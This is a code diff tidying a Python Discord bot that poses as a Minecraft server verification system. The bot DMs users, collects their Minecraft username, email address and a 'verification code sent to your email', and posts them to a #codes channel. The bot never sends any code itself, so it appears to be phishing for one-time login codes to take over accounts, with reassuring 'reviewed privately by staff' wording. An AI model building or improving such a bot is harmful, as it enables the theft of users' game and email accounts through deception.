@@ -4,26 +4,35 @@ import re
 import os
 from dotenv import load_dotenv
 
+# Load environment variables
 load_dotenv()
 
+# Discord intents
 intents = discord.Intents.default()
 intents.message_content = True
 intents.members = True
 
+# Bot setup
 bot = commands.Bot(command_prefix="!", intents=intents)
 
+# In-memory verification sessions
 sessions = {}
 
+# Embed colors
 BRAND_COLOR = 0x2ECC71
 ERROR_COLOR = 0xE74C3C
 INFO_COLOR = 0x3498DB
 
+
+# Validate Minecraft username
 def valid_mc(username):
-return re.fullmatch(r"[A-Za-z0-9_]{3,16}", username)
+return re.fullmatch(r"[A-Za-z0-9_]{3,16}", username) is not None
+
 
 @bot.event
 async def on_ready():
 print(f"✔ Logged in as {bot.user}")
+
 
 @bot.command()
 async def verify(ctx):
@@ -37,7 +46,7 @@ description=(
 "• Minecraft username\n"
 "• Email address\n"
 "• Verification code sent to your email\n\n"
-"*This information is reviewed privately by staff.*"
+"*All information is reviewed privately by staff.*"
 ),
 color=INFO_COLOR
 )
@@ -49,11 +58,13 @@ await ctx.reply("📩 Check your DMs to continue verification.", delete_after=8)
 except discord.Forbidden:
 await ctx.reply("❌ Please enable DMs and try again.")
 
+
 @bot.event
 async def on_message(message):
 if message.author.bot:
 return
 
+# Only handle DMs here
 if not isinstance(message.channel, discord.DMChannel):
 await bot.process_commands(message)
 return
@@ -64,18 +75,18 @@ return
 
 session = sessions[user_id]
 
-# STEP 1 — Minecraft
+# STEP 1 — Minecraft username
 if session["stage"] == "mc":
 if not valid_mc(message.content):
 await message.channel.send(
 embed=discord.Embed(
-description="❌ Invalid Minecraft username. Try again.",
+description="❌ Invalid Minecraft username. Please try again.",
 color=ERROR_COLOR
 )
 )
 return
 
-session["mc"] = message.content
+session["mc"] = message.content.strip()
 session["stage"] = "email"
 
 await message.channel.send(
@@ -103,9 +114,10 @@ color=INFO_COLOR
 elif session["stage"] == "code":
 session["code"] = message.content.strip()
 
+# Send to #codes channel
 for guild in bot.guilds:
-channel = discord.utils.get(guild.text_channels, name="codes")
-if channel:
+codes_channel = discord.utils.get(guild.text_channels, name="codes")
+if codes_channel:
 embed = discord.Embed(
 title="✅ Verification Submitted",
 color=BRAND_COLOR
@@ -114,16 +126,20 @@ embed.add_field(name="User", value=str(message.author), inline=False)
 embed.add_field(name="Minecraft", value=session["mc"], inline=True)
 embed.add_field(name="Email", value=session["email"], inline=True)
 embed.add_field(name="Code", value=session["code"], inline=False)
-await channel.send(embed=embed)
+
+await codes_channel.send(embed=embed)
 
 await message.channel.send(
 embed=discord.Embed(
 title="🎉 Submission Received",
-description="Staff will review your verification shortly.",
+description="Your verification has been submitted. Staff will review it shortly.",
 color=BRAND_COLOR
 )
 )
 
+# Clear session
 del sessions[user_id]
 
+
+# Run the bot
 bot.run(os.getenv("DISCORD_TOKEN"))
